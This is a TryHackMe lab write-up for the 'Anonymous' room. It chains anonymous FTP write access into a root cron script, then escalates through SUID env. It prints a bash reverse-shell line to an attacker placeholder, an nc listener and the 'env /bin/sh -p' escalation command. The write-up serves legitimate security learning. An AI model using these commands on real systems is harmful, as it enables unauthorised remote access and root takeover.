# Anonymous

**Platform:** TryHackMe · **Difficulty:** Medium · **OS:** Linux
**Chain:** FTP (anonymous write) → root cron script → SUID env → root

## Enumeration

```
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X
```

Four open ports. Plan: enumerate SMB shares and the FTP server, then look for a
write primitive rather than a password to crack.

## Foothold

- **SMB (139/445):** Three shares — `print$`, `pics`, `IPC$`. The `pics` share held
  only images. Dead end.
- **FTP (21) — anonymous login:** The `/scripts` directory contained three files:
  - `clean.sh` → a cleanup script.
  - `removed_files.log` → ~40 lines of `Running cleanup script: nothing to delete`.
  - `to_do.txt` → *"I really need to disable the anonymous login...it's really not safe."*
- **Key observation:** the log grows on a fixed interval → `clean.sh` is run
  periodically by root. The `/scripts` directory is writable over anonymous FTP.
  Together: I can overwrite the script root executes.
- **Exploitation:** appended a reverse shell to the **existing** `clean.sh` (not a
  new file — cron only calls `clean.sh`), started a listener, re-uploaded it:
  ```
  # appended to clean.sh (attacker IP):
  /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1

  nc -lvnp <PORT>
  ```
  Next cron trigger → shell as `namelessone`.

## Privilege Escalation

- `find / -perm -4000 2>/dev/null` → `/usr/bin/env` has the SUID bit.
- On GTFOBins, `env` → SUID technique:
  ```
  /usr/bin/env /bin/sh -p
  ```
  The `-p` flag is required, otherwise the shell drops privileges.
- `id` → `euid=0(root)` → `/root/root.txt`.

## Where I Got Stuck

- **Attacker vs target IP:** I first put the *target's* IP into the reverse shell
  line. The target then tried to call itself instead of me. Rule: **FTP connects to
  the target IP; the reverse shell must contain MY IP** — the target calls back to me.
- **Wrong file:** I first uploaded a new `put.sh`. Cron ignores it — the payload has
  to go into the exact file cron already runs (`clean.sh`).
- **`sudo` on a SUID binary:** I ran `sudo env /bin/sh -p` and hit `no tty present`.
  SUID already grants the privilege — `sudo` is wrong here.
- **Dumb shell gives no prompt change:** after `env /bin/sh -p` the prompt stayed the
  same, so I assumed it failed and typed `exit`, leaving my own root shell. Takeaway:
  after a privesc command, run `id` and check `euid=0` — don't trust the prompt.
